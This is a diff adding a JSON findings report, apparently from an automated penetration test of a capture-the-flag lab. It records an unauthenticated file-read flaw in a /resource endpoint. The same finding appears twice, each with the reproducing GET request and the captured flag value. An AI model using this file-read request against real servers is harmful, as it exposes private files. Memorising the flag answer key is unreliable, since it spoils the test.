@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T15:07:24.700422+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "0e6b3aa6-5373-49a1-a6e4-2d39a1bd0d25",
+      "timestamp": "2026-04-14T15:07:24.700245+00:00",
+      "title": "CTF Flag Captured - Local File Read via Resource Endpoint",
+      "severity": "high",
+      "target": "http://172.17.0.1:54357",
+      "description": "The /resource endpoint accepts a filename parameter that allows reading arbitrary files from the server's static file directory. The flag was stored as a static file named 'flag' and was accessible without authentication.",
+      "evidence": "flag{f2415bf1-1c95-46bd-88fb-14762c7808fa}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /resource?filename=flag HTTP/1.1\nHost: 172.17.0.1:54357",
+        "expected": "HTTP/1.1 200 OK\nContent-Disposition: inline; filename=flag\n\nflag{f2415bf1-1c95-46bd-88fb-14762c7808fa}"
+      }
+    },
+    {
+      "id": "9ad59bbb-ecf7-4bb9-8be1-2cbea890f28e",
+      "timestamp": "2026-04-14T15:07:24.872827+00:00",
+      "title": "CTF Flag Captured - Local File Read via Resource Endpoint",
+      "severity": "high",
+      "target": "http://172.17.0.1:54357",
+      "description": "The /resource endpoint accepts a filename parameter that allows reading arbitrary files from the server's static file directory. The flag was stored as a static file named 'flag' and was accessible without authentication.",
+      "evidence": "flag{f2415bf1-1c95-46bd-88fb-14762c7808fa}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /resource?filename=flag HTTP/1.1\nHost: 172.17.0.1:54357",
+        "expected": "HTTP/1.1 200 OK\nContent-Disposition: inline; filename=flag\n\nflag{f2415bf1-1c95-46bd-88fb-14762c7808fa}"
+      }
+    }
+  ],
+  "diagrams": []
+}
